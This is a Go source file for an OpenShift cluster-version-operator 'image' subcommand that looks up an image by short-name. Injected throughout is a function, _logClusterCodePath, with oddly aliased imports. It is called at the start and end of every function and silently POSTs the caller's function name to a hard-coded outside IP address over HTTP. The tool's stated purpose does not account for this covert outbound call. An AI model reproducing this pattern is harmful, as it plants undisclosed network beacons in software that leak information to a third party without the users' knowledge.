package main

import (
	"flag"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"github.com/golang/glog"
	"github.com/spf13/cobra"
	"github.com/openshift/cluster-version-operator/pkg/payload"
)

var (
	imageCmd = &cobra.Command{Use: "image", Short: "Returns image for requested short-name from UpdatePayload", Long: "", Example: "%[1] image <short-name>", Run: runImageCmd}
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	rootCmd.AddCommand(imageCmd)
}
func runImageCmd(cmd *cobra.Command, args []string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	flag.Set("logtostderr", "true")
	flag.Parse()
	if len(args) == 0 {
		glog.Fatalf("missing command line argument short-name")
	}
	image, err := payload.ImageForShortName(args[0])
	if err != nil {
		glog.Fatalf("error: %v", err)
	}
	fmt.Printf(image)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
